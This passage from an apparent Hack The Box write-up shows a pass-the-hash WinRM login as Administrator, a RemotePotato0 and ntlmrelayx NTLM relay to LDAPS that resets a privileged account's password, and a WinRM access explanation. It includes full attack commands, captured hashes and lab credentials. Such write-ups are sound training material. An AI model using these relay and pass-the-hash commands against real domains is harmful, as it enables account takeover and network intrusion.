[*] Cleaning up...
```

### Shell

I’ll use that hash to get a WinRM shell as Administrator:

```rust
oxdf@hacky$ evil-winrm-py -i DC01.pirate.htb -u Administrator -H 598295e78bd72d66f837997baf715171
          _ _            _                             
  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
 / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
 \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
                                            |_|   |__/  v1.6.0

[*] Connecting to 'DC01.pirate.htb:5985' as 'Administrator'
evil-winrm-py PS C:\Users\Administrator\Documents>
```

And grab the root flag:

```
evil-winrm-py PS C:\Users\Administrator\Desktop> cat root.txt
73b01728************************
```

## Beyond Root

### Shortcut Path

#### Overview

There’s a shortcut path which is actually how I originally solved, skipping the Administrator access on WEB01 and going directly to auth as A.White_adm.

I’ll note [above](#users-3) that the A.White user is logged into the WEB01 box. I can use a cross-session relay attack (like I’ve shown in [HTB Mirage](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html), [HTB Shibuya](https://0xdf.gitlab.io/2025/06/19/htb-shibuya.html), and [HTB Rebound](https://0xdf.gitlab.io/2024/03/30/htb-rebound.html)) with [RemotePotato](https://github.com/antonioCoco/RemotePotato0) to coerce authentication from the logged in user back to a host I control. In each of the previous examples, I got a hash to crack. Here that password is not easily cracked. Instead I’ll use `ntlmrelayx.py` to relay the auth to DC01. I’ll have it create an LDAP shell so I can take actions as A.White on the DC. And it happens that A.White can change the password of A.White_adm, which I’ll do via that LDAP shell. Compared to the path shown above, this path looks like:

```swift
#mermaid-1789613480820{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#333;}#mermaid-1789613480820 .error-icon{fill:#552222;}#mermaid-1789613480820 .error-text{fill:#552222;stroke:#552222;}#mermaid-1789613480820 .edge-thickness-normal{stroke-width:2px;}#mermaid-1789613480820 .edge-thickness-thick{stroke-width:3.5px;}#mermaid-1789613480820 .edge-pattern-solid{stroke-dasharray:0;}#mermaid-1789613480820 .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-1789613480820 .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-1789613480820 .marker{fill:#333333;stroke:#333333;}#mermaid-1789613480820 .marker.cross{stroke:#333333;}#mermaid-1789613480820 svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-1789613480820 .label{font-family:"trebuchet ms",verdana,arial,sans-serif;color:#333;}#mermaid-1789613480820 .cluster-label text{fill:#333;}#mermaid-1789613480820 .cluster-label span,#mermaid-1789613480820 p{color:#333;}#mermaid-1789613480820 .label text,#mermaid-1789613480820 span,#mermaid-1789613480820 p{fill:#333;color:#333;}#mermaid-1789613480820 .node rect,#mermaid-1789613480820 .node circle,#mermaid-1789613480820 .node ellipse,#mermaid-1789613480820 .node polygon,#mermaid-1789613480820 .node path{fill:#ECECFF;stroke:#9370DB;stroke-width:1px;}#mermaid-1789613480820 .flowchart-label text{text-anchor:middle;}#mermaid-1789613480820 .node .label{text-align:center;}#mermaid-1789613480820 .node.clickable{cursor:pointer;}#mermaid-1789613480820 .arrowheadPath{fill:#333333;}#mermaid-1789613480820 .edgePath .path{stroke:#333333;stroke-width:2.0px;}#mermaid-1789613480820 .flowchart-link{stroke:#333333;fill:none;}#mermaid-1789613480820 .edgeLabel{background-color:#e8e8e8;text-align:center;}#mermaid-1789613480820 .edgeLabel rect{opacity:0.5;background-color:#e8e8e8;fill:#e8e8e8;}#mermaid-1789613480820 .labelBkg{background-color:rgba(232, 232, 232, 0.5);}#mermaid-1789613480820 .cluster rect{fill:#ffffde;stroke:#aaaa33;stroke-width:1px;}#mermaid-1789613480820 .cluster text{fill:#333;}#mermaid-1789613480820 .cluster span,#mermaid-1789613480820 p{color:#333;}#mermaid-1789613480820 div.mermaidTooltip{position:absolute;text-align:center;max-width:200px;padding:2px;font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:12px;background:hsl(80, 100%, 96.2745098039%);border:1px solid #aaaa33;border-radius:2px;pointer-events:none;z-index:100;}#mermaid-1789613480820 .flowchartTitleText{text-anchor:middle;font-size:18px;fill:#333;}#mermaid-1789613480820 :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}intendedunintendedshell as gMSA_ADFS_prod$ on DC01Coerce WEB01$Relay
RBCDShell as Administrator
on WEB01Credential DumpAuth as A.WhiteChange A.White_adm
PasswordAuth as A.White_admTunnelShell as gMSA_ADFS_prod$ on WEB01Cross Session Relay
RemotePotato0.exeLDAP Shell as
A.white
```

#### Hash Fail

To pull off this attack, I can first do the thing I’ve done previously, coercing authentication from the logged in user to get a Net-NTLMv2 hash. To coerce authentication, I have to have the user start a connection on RPC to an Oxid resolver. `RemotePotato0.exe` creates that resolver, but since it’s running on a Windows machine and RPC is already listening, it has to listen on a different port (TCP 9999 by default). But RPC will only reach out to TCP 135, so I’ll create a tunnel using `socat` that allows Windows to reach out to my RPC port and I forward that right back to TCP 9999 on WEB01 (where the fake Oxid resolver is listening):

```bash
proxychains socat tcp-listen:135,fork,reuseaddr tcp:192.168.100.2:9999
```

Now I run `RemotePotato0.exe` on WEB01 with the following arguments:

-   `-m 2` - module 2, Rpc capture (hash) server + potato trigger
-   `-s 1` - session id where the user is logged in (see the `qwinsta` output)
-   `-x 10.10.15.169` - The IP for the Oxid resolver, my HTB VPN IP

It runs, and works, returning a Net-NTLM-v2 challenge response:

```yaml
evil-winrm-py PS C:\programdata> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.15.169
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 9999
[*] Example Network redirector: 
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the RPC server to capture the credentials hash from the user authentication!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : WEB01
NTLMv2 Username : PIRATE\a.white
NTLMv2 Hash     : a.white::PIRATE:9f0d3fc5cdade373:c82466882632cef3b14d796ff6ae6ee8:a95f1cdefc990c72
```

I [know A.White’s password](#enumeration) is E2nvAOKSz5Xz2MJu, which is not in any password lists in [SecLists](https://github.com/danielmiessler/SecLists), and thus isn’t going to be easily cracked.

#### Relay

The relay spans three hosts. My VM runs `socat` to forward to the fake Oxid resolver on WEB01:9999 and `ntlmrelayx.py`. WEB01 runs `RemotePotato0.exe` to coerce the logged-in A.White session and the fake Oxid resolver on:9999, and that authentication is relayed on to DC01 to start an LDAP shell:

```css
DC01My VMWEB01DC01My VMWEB01#mermaid-1789613480998{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#ccc;}#mermaid-1789613480998 .error-icon{fill:#a44141;}#mermaid-1789613480998 .error-text{fill:#ddd;stroke:#ddd;}#mermaid-1789613480998 .edge-thickness-normal{stroke-width:2px;}#mermaid-1789613480998 .edge-thickness-thick{stroke-width:3.5px;}#mermaid-1789613480998 .edge-pattern-solid{stroke-dasharray:0;}#mermaid-1789613480998 .edge-pattern-dashed{stroke-dasharray:3;}#mermaid-1789613480998 .edge-pattern-dotted{stroke-dasharray:2;}#mermaid-1789613480998 .marker{fill:lightgrey;stroke:lightgrey;}#mermaid-1789613480998 .marker.cross{stroke:lightgrey;}#mermaid-1789613480998 svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#mermaid-1789613480998 .actor{stroke:#81B1DB;fill:#1f2020;}#mermaid-1789613480998 text.actor>tspan{fill:lightgrey;stroke:none;}#mermaid-1789613480998 .actor-line{stroke:lightgrey;}#mermaid-1789613480998 .messageLine0{stroke-width:1.5;stroke-dasharray:none;stroke:lightgrey;}#mermaid-1789613480998 .messageLine1{stroke-width:1.5;stroke-dasharray:2,2;stroke:lightgrey;}#mermaid-1789613480998 #arrowhead path{fill:lightgrey;stroke:lightgrey;}#mermaid-1789613480998 .sequenceNumber{fill:black;}#mermaid-1789613480998 #sequencenumber{fill:lightgrey;}#mermaid-1789613480998 #crosshead path{fill:lightgrey;stroke:lightgrey;}#mermaid-1789613480998 .messageText{fill:lightgrey;stroke:none;}#mermaid-1789613480998 .labelBox{stroke:#81B1DB;fill:#1f2020;}#mermaid-1789613480998 .labelText,#mermaid-1789613480998 .labelText>tspan{fill:lightgrey;stroke:none;}#mermaid-1789613480998 .loopText,#mermaid-1789613480998 .loopText>tspan{fill:lightgrey;stroke:none;}#mermaid-1789613480998 .loopLine{stroke-width:2px;stroke-dasharray:2,2;stroke:#81B1DB;fill:#81B1DB;}#mermaid-1789613480998 .note{stroke:#8fa0c0;fill:#3a3f4b;}#mermaid-1789613480998 .noteText,#mermaid-1789613480998 .noteText>tspan{fill:#ffffff;stroke:none;}#mermaid-1789613480998 .activation0{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:#81B1DB;}#mermaid-1789613480998 .activation1{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:#81B1DB;}#mermaid-1789613480998 .activation2{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:#81B1DB;}#mermaid-1789613480998 .actorPopupMenu{position:absolute;}#mermaid-1789613480998 .actorPopupMenuPanel{position:absolute;fill:#1f2020;box-shadow:0px 8px 16px 0px rgba(0,0,0,0.2);filter:drop-shadow(3px 5px 2px rgb(0 0 0 / 0.4));}#mermaid-1789613480998 .actor-man line{stroke:#81B1DB;fill:#1f2020;}#mermaid-1789613480998 .actor-man circle,#mermaid-1789613480998 line{stroke:#81B1DB;fill:#1f2020;stroke-width:2px;}#mermaid-1789613480998 :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}ntlmrelayx.py -t ldaps://DC01 -i --remove-micsocat :135 to WEB01:9999RemotePotato0.exe -m 0 -s 1Rogue Oxid Resolver directsA.White to authenticate (NTLM to :9997)LDAP shell on 127.0.0.1:11000Spawn COM object in A.White's session (trigger)1DCOM OXID resolution to :1352socat forwards toRogue Oxid Resolver (TCP 9999)3NTLM to RemotePotato RPC relay :99974Forward A.White NTLM to ntlmrelayx :805Relay auth over LDAPS (--remove-mic)6Authenticated as PIRATE\A.White7change_password a.white_adm8Password changed9
```

When I run `RemotePotato0.exe`, it spawns a COM object in A.White’s session, which then reaches out to the Oxid resolver on my host TCP 135. That port is serving a `socat` tunnel back to the rogue Oxid resolver from `RemotePotato0.exe` on 9999. The rogue resolver answers that resolution with a binding that directs A.White’s session to authenticate using NetNTLM to the RPC relay on:9997, where `RemotePotato0.exe` relays it to port 80 on my VM. On my VM, `ntlmrelayx.py` is listening on port 80, and relays that challenge over to DC01 over LDAPS (removing the MIC), and uses that to get a LDAP shell. Within that shell, A.White can use its permissions to change the password of A.White_adm.

I’ll start `ntlmrelayx.py` with the following options:

-   `-t ldaps://DC01.pirate.htb` - The target to relay to.
-   `-smb2support` - Allow for SMBv2
-   `-i` - Interactive. Since I’m relaying to LDAP, it’ll start an LDAP shell.
-   `--remove-mic` - This removes the NTLM message integrity check, allowing me to relay.

The `--remove-mic` flag is important. Without it, when the relay happens, it’ll fail like this:

```
[*] Servers started, waiting for connections
[*] Setting up RDP Server on port 3389
[*] (HTTP): Client requested path: /  
[*] (HTTP): Connection from 10.129.60.234 controlled, attacking target ldaps://DC01.pirate.htb
[!] The client requested signing. Relaying to LDAP will not work! (This usually happens when relaying from SMB to LDAP)
[*] (HTTP): Client requested path: /             
[-] (HTTP): Authenticating against ldaps://DC01.pirate.htb as PIRATE/A.WHITE FAILED
```

With that started, I’ll run `RemotePotato0.exe`, this time with:

-   `-m 0` - module 0, Rpc2Http cross protocol relay server + potato trigger
-   `-s 1` - session id where the user is logged in (see the `qwinsta` output)
-   `-x 10.10.15.169` - The IP for the Oxid resolver, my HTB VPN IP
-   `-r 10.10.15.169` - The IP to send the HTTP auth to.
-   `-t 80` - The port to send the HTTP auth to.

I’ll run it, and it reports success:

```scala
evil-winrm-py PS C:\programdata> .\RemotePotato0.exe -m 0 -r 10.10.15.169 -t 80 -x 10.10.15.169 -s 1
[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on 10.10.15.169 to your victim machine on port 9999
[*] Example Network redirector: 
        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:9999
[*] Starting the NTLM relay attack, launch ntlmrelayx on 10.10.15.169!!
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
[*] RPC relay server listening on port 9997 ...
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written: 106 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to ntlmrelayx HTTP Server 10.10.15.169 on port 80
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] Got NTLM type 3 AUTH message from PIRATE\a.white with hostname WEB01 
[+] Relaying seems successful, check ntlmrelayx output!
```

At `ntlmrelayx.py`, it reports success as well:

```typescript
oxdf@hacky$ sudo ntlmrelayx.py -t ldaps://DC01.pirate.htb -smb2support -i --remove-mic
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
...[snip]...
[*] Servers started, waiting for connections
[*] (HTTP): Client requested path: /
[*] (HTTP): Connection from 10.129.60.234 controlled, attacking target ldaps://DC01.pirate.htb
[*] (HTTP): Client requested path: /
[*] (HTTP): Authenticating connection from PIRATE/A.WHITE@10.129.60.234 against ldaps://DC01.pirate.htb SUCCEED [1]
[*] ldaps://PIRATE/A.WHITE@dc01.pirate.htb [1] -> Started interactive Ldap shell via TCP on 127.0.0.1:11000 as PIRATE/A.WHITE
```

It says there’s an LDAP shell on localhost port 11000. I’ll connect with `nc`, and use the `change_password` command:

```
oxdf@hacky$ nc 127.0.0.1 11000
Type help for list of commands

# change_password a.white_adm .0xdf0xdf
Got User DN: CN=Angela W. ADM,CN=Users,DC=pirate,DC=htb
Attempting to set new password of: .0xdf0xdf
Password changed successfully!
```

`netexec` shows it works:

```css
oxdf@hacky$ netexec smb DC01.pirate.htb -u a.white_adm -p '.0xdf0xdf'
SMB         10.129.60.234   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:False) (Null Auth:True) (DC:True)
SMB         10.129.60.234   445    DC01             [+] pirate.htb\a.white_adm:.0xdf0xdf 
```

From here I can continue the same path to Administrator as above.

### gMSA Accounts WinRM on WEB01

Both `gMSA_ADCS_prod$` and `gMSA_ADFS_prod$` can WinRM into DC01, but on WEB01 only `gMSA_ADFS_prod$` works. `gMSA_ADCS_prod$` fails:

```typescript
oxdf@hacky$ proxychains evil-winrm-py -i WEB01.pirate.htb -u 'gMSA_ADCS_prod$' -H 1430191bce4f3731edd34d8c24a56c23
...[snip]...
[*] Connecting to 'WEB01.pirate.htb:5985' as 'gMSA_ADCS_prod$'
[-] Failed to authenticate the user gMSA_ADCS_prod$ with ntlm
```

That same hash works fine on DC01, so it’s not the issue. This actually has to do with what groups are checked for remote access. WinRM access to a host is gated by that host’s local groups. The default `Microsoft.PowerShell` session configuration grants its endpoint only to the local Administrators and local Remote Management Users groups.

Looking at the two accounts in BloodHound, each is provisioned for the service its name implies, and those services run on different hosts:

| Account | SPN | Service runs on |
| --- | --- | --- |
| `gMSA_ADFS_prod$` | `host/adfs.pirate.htb` | WEB01 (federation is web-facing) |
| `gMSA_ADCS_prod$` | *(none)* | DC01 (the CA `PIRATE-DC01-CA` is hosted on DC01) |

Both accounts are members of the domain builtin `Remote Management Users` group (`CN=Remote Management Users,CN=Builtin`). That builtin governs remote management of the domain controller, which is why both can WinRM into DC01. But it does nothing for a member server. On WEB01, only `gMSA_ADFS_prod$` is in the local group:

```sql
evil-winrm-py PS C:\> net localgroup "Remote Management Users"
Alias name     Remote Management Users
Comment        Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.

Members
-------------------------------------------------------------------------------
PIRATE\gMSA_ADFS_prod$
The command completed successfully.
```

Two notes on WinRM error messages, which is easy to misread:

-   `Failed to authenticate the user gMSA_ADCS_prod$ with ntlm` looks like a bad credential, but `evil-winrm-py` surfaces a WinRM 401 the same way whether the cause is a rejected credential or “authenticated, but no access to this endpoint.” In this case, it’s the lack of access.
-   Retrying with `-k` returned `No applicable credentials available`. That one is from my WinRM client. `-k` reads a Kerberos ccache, and there was no TGT for `gMSA_ADCS_prod$` in it, so that attempt never actually reached WEB01’s authorization check. Getting a TGT first (`getTGT.py`) and then retrying `-k` gives the real access-denied.
